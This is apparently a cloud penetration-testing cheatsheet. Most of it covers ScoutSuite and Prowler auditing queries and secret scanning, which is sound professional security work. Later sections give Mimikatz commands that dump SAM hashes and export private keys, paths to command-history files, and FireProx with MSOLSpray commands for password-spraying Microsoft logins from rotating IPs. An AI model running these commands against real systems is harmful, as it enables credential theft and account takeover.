## Other Useful Cloud Tools and Techniques Cheatsheet
By Beau Bullock (@dafthack)
### ScoutSuite

Multi-cloud security auditing tool

https://github.com/nccgroup/ScoutSuite

Install ScoutSuite

```bash
sudo apt-get install virtualenv
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
virtualenv –p python3 venv
source venv/bin/activate
pip install –r requirements.txt
```

To run as root

```bash
sudo apt-get install virtualenv
sudo su
virtualenv -p python3 venv
source venv/bin/activate
pip install scoutsuite
```

Scan AWS environment with ScoutSuite

```bash
python scout.py aws --profile=<aws profile name>

or if installed...

scout aws --profile=<aws profile name>
```

### jq queries to help with parsing many ScoutSuite reports

Sometimes you may need to work with multiple ScoutSuite files and report similar items across all of them. The ScoutSuite reports are in json format so the 'jq' tool can be used to parse through them easily. Here are a few short script examples for doing this. Run these from the directory where you output each of the ScoutSuite folders to. 

#### AWS
```bash

### Find all ec2 ebs volumes unencrypted

for d in scoutsuite_results_aws-* ;do tail $d -n +2 | jq -r '.services.ec2.regions[].volumes[] | select(.Encrypted == false) | .arn' >> ec2-ebs-volume-not-encrypted.txt; done


### Find all ec2 ebs snapshots unencrypted

for d in scoutsuite_results_aws-* ;do tail $d -n +2 | jq -r '.services.ec2.regions[].snapshots[] | select(.encrypted == false) | .arn' >> ec2-ebs-snapshot-not-encrypted.txt; done


### Inline Role Policy Contains NotActions

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Inline role Policy Allows \"NotActions\"")) | .items[]' | sed 's/\.inline_policies.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-inline-role-policy-contains-notactions.txt; done; done


### Inline Role Policy Allows iam:PassRole for All Resources

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Inline role Policy Allows \"iam:PassRole\" For All Resources")) | .items[]' | sed 's/\.inline_policies.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-inline-role-policy-allows-iampassrole-for-all-resources.txt; done; done


### Inline Role Policy Allows sts:AssumeRole for All Resources

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Inline role Policy Allows \"sts:AssumeRole\" For All Resources")) | .items[]' | sed 's/\.inline_policies.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-inline-role-policy-allows-stsassumerole-for-all-resources.txt; done; done


### Managed Policy Allows iam:PassRole for All Resources (without account numbers to get count)

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"iam:PassRole\" For All Resources")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-iampassrole-for-all-resources-NOACCOUNTNUMBERS.txt; done; done


### Managed Policy Allows iam:PassRole for All Resources (with account numbers)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-managed-policy-allows-iampassrole-for-all-resources.txt;for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"iam:PassRole\" For All Resources")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-iampassrole-for-all-resources.txt; done; done


### Managed Policy Allows NotActions (without account numbers to get counts)

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"NotActions\"")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-notactions-NOACCOUNTNUMBERS.txt; done; done


### Managed Policy Allows NotActions (with account numbers)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-managed-policy-allows-notactions.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"NotActions\"")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-notactions.txt; done; done


### Managed Policy Allows sts:AssumeRole for All Resources (without account numbers)

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"sts:AssumeRole\" For All Resources")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-stsassumerole-for-all-resources-NOACCOUNTNUMBERS.txt; done; done


### Managed Policy Allows sts:AssumeRole for All Resources (with account numbers)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-managed-policy-allows-stsassumerole-for-all-resources.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows \"sts:AssumeRole\" For All Resources")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-stsassumerole-for-all-resources.txt; done; done


### Managed Policy Allows All Actions (without account numbers)

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows All Actions")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-allactions-NOACCOUNTNUMBERS.txt; done; done


### Managed Policy Allows All Actions (with account numbers)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-managed-policy-allows-allactions.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Managed Policy Allows All Actions")) | .items[]' | sed 's/\.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-managed-policy-allows-allactions.txt; done; done


### Cross-Account AssumeRole Policy Lacks External ID and MFA (without account numbers)

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Cross-Account AssumeRole Policy Lacks External ID and MFA")) | .items[]' | sed 's/\.assume_role_policy.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-cross-account-policy-lacks-external-id-and-mfa-NOACCOUNTNUMBERS.txt; done; done


### Cross-Account AssumeRole Policy Lacks External ID and MFA (with account numbers)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-cross-account-policy-lacks-external-id-and-mfa.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Cross-Account AssumeRole Policy Lacks External ID and MFA")) | .items[]' | sed 's/\.assume_role_policy.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-cross-account-policy-lacks-external-id-and-mfa.txt; done; done


### Assume Role Policy Allows All Principals

for d in scoutsuite_results_aws-* ; do for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("AssumeRole Policy Allows All Principals")) | .items[]' | sed 's/\.assume_role_policy.PolicyDocument.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-assumerole-policy-allows-allprincipals-NOACCOUNTNUMBERS.txt; done; done


### Lack of Key Rotation for Active Days

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-lack-of-key-rotation-for-active-days.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Lack of Key Rotation for (Active) Days")) | .items[]' | sed 's/\.AccessKeys.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-lack-of-key-rotation-for-active-days.txt; done; done


### Lack of Key Rotation for Active Days (with create date)

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-lack-of-key-rotation-for-active-days-WITHCREATEDATE.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("Lack of Key Rotation for (Active) Days")) | .items[]' | sed 's/\.AccessKeys.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn,.AccessKeys[].CreateDate" >> iam-lack-of-key-rotation-for-active-days-WITHCREATEDATE.txt; done; done


### Users Without MFA

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-user-without-mfa.txt; for item in $(tail $d -n +2 | jq -r '.services.iam.findings[] | select (.description | contains("User without MFA")) | .items[]' | sed 's/\.mfa_enabled.*//'); do tail $d -n +2 | jq -r ".services.$item | .arn" >> iam-user-without-mfa.txt; done; done


### Password Policy

for d in scoutsuite_results_aws-* ; do tail $d -n +2 | jq -r '.account_id' >> iam-password-policy.txt; tail $d -n +2 | jq -r '.services.iam.password_policy' >> iam-password-policy.txt; done


### CloudTrail Service Not Configured

for d in scoutsuite_results_aws-* ; do echo " " >> cloudtrail-service-not-configured.txt; tail $d -n +2 | jq -r '.account_id' >> cloudtrail-service-not-configured.txt; tail $d -n +2 | jq -r '.services.cloudtrail.findings[] | select (.description | contains("Service Not Configured")) | .items[]' | sed 's/\.NotConfigured*//' >> cloudtrail-service-not-configured.txt; done


---------- OLD QUERIES THAT NEED UPDATING ----------
### Find All Lambda Environment Variables
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.awslambda.regions[].functions[] | select (.env_variables != []) | .arn, .env_variables' >> lambda-all-environment-variables.txt
done

### Find World Listable S3 Buckets
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id, .services.s3.findings."s3-bucket-AuthenticatedUsers-read".items[]'  >> s3-buckets-world-listable.txt
done

### Find All EC2 User Data
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].vpcs[].instances[] | select (.user_data != null) | .arn, .user_data'  >> ec2-instance-all-user-data.txt
done

### Find EC2 Security Groups That Whitelist AWS CIDRs
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.account_id' >> ec2-security-group-whitelists-aws-cidrs.txt
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.findings."ec2-security-group-whitelists-aws".items'  >> ec2-security-group-whitelists-aws-cidrs.txt
done

### Find EC2 EBS Public AMIs
for d in */ ; do
	tail $d/scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.ec2.regions[].images[] | select (.Public == true) | .arn' >> ec2-public-amis.txt
done


```
#### Azure
```bash
### List All Azure App Service Host Names
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.appservice.subscriptions[].web_apps[].host_names[]'

### List All Azure SQL Servers
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.sqldatabase.subscriptions[].servers[] | .name,".database.windows.net","\n"'

### List All Azure Virtual Machine Hostnames 
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -jr '.services.virtualmachines.subscriptions[].instances[] | .name,".",.location,".cloudapp.windows.net","\n"'

### List Storage Accounts
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .name'

### List Storage and containers for mangle script
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq -r '.services.storageaccounts.subscriptions[].storage_accounts[] | .blob_containers_count,.name,.blob_containers[].id' > /root/Desktop/storage.txt

### List disks encrypted with PMKs
tail scoutsuite_results_azure-tenant-*.js -n +2 | jq '.services.virtualmachines.subscriptions[].disks[] | select(.encryption_type = "EncryptionAtRestWithPlatformKey") | .name' > disks-with-pmks.txt
```

### Custom jq Parsing Help
Sometimes json files are extremely large and can be difficult to parse through each level of child parameters. Using with_entries will help to only list direct child objects making it easier to navigate through a json file.
```bash
tail scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.cloudtrail | with_entries(select(.value | scalars))'
{
  "IncludeGlobalServiceEvents": true,
  "regions_count": 17,
  "trails_count": 34
}

tail scoutsuite-results/scoutsuite_results*.js -n +2 | jq '.services.cloudtrail.regions[] | with_entries(select(.value | scalars))'
{
  "id": "ap-northeast-1",
  "name": "ap-northeast-1",
  "region": "ap-northeast-1",
  "trails_count": 2
}
{
  "id": "ap-northeast-2",
  "name": "ap-northeast-2",
  "region": "ap-northeast-2",
  "trails_count": 2
}
etc...
```

### Prowler Parsing Help

Get Critical Vulns

```
for d in prowler-output-*.json ; do tail $d -n +1 | jq -r '.[] | select (.Severity == "critical") | .AccountId,.ResourceArn,.ServiceName,.Description,.StatusExtended,.Risk' >> prowler-critical-vulns-shortlist.txt
done

for d in prowler-output-*.json ; do tail $d -n +1 | jq -r '.[] | select (.Severity == "critical")' >> prowler-critical-vulns-full-findings.txt
done
```

Sort all services in Prowler output for looping to pull criticals for each individually

```
for d in prowler-output-*.json ; do tail $d -n +1 | jq -r '.[].ServiceName' | sort -u >> servicesunsorted.txt; done
sort -u servicesunsorted.txt > services.txt

while read -r p; do
    for d in prowler-output-*.json; do
        echo $p; echo $d
        tail "$d" -n +1 | jq -r --arg service "$p" '.[] | select(.ServiceName == $service and .Severity == "critical")' >> "$p-criticals.txt"
    done
done < services.txt
```

### Cloud_Enum

Tool to search for public resources in AWS, Azure, and GCP

https://github.com/initstring/cloud_enum

```bash
python3 cloud_enum.py -k <name-to-search>
```

### GitLeaks

Search repositories for secrets

https://github.com/zricethezav/gitleaks

Pull GitLeaks with Docker

```bash
sudo docker pull zricethezav/gitleaks
```

Print the help menu

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks --help
```

Use GitLeaks to search for secrets

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r <repo URL>
```

TruffleHog - https://github.com/dxa4481/truffleHog

Shhgit - https://github.com/eth0izzle/shhgit

Gitrob - https://github.com/michenriksen/gitrob

### Mimikatz

Export Non-Exportable Private Keys From Web Server

```textile
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

Dump passwords hashes from SAM/SYSTEM files

```textile
mimikatz# lsadump::sam /system:SYSTEM /sam:SAM
```

### Check Command History

Linux Bash History Location

```bash
~/.bash_history
```

Windows PowerShell PSReadLine Location

```bash
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### PowerView

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
Find on-prem ADConnect account name and server

```powershell
Get-NetUser -Filter "(samAccountName=MSOL_*)" |Select-Object name,description | fl
```

### FireProx

Password Spraying Azure/O365 while randomizing IPs with FireProx

Install

```bash
git clone https://github.com/ustayready/fireprox
cd fireprox
virtualenv -p python3 .
source bin/activate
pip install -r requirements.txt
python fire.py
```

Launch FireProx

```bash
python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region <region> --url https://login.microsoft.com --command create
```

Password spray using FireProx + MSOLSpray

```powershell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
```

### ip2Provider

Check a list of IP addresses against cloud provider IP space

https://github.com/oldrho/ip2provider

### Vulnerable Infrastructure Creation

Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat

SadCloud - https://github.com/nccgroup/sadcloud

Flaws Cloud - http://flaws.cloud

Thunder CTF - http://thunder-ctf.cloud 
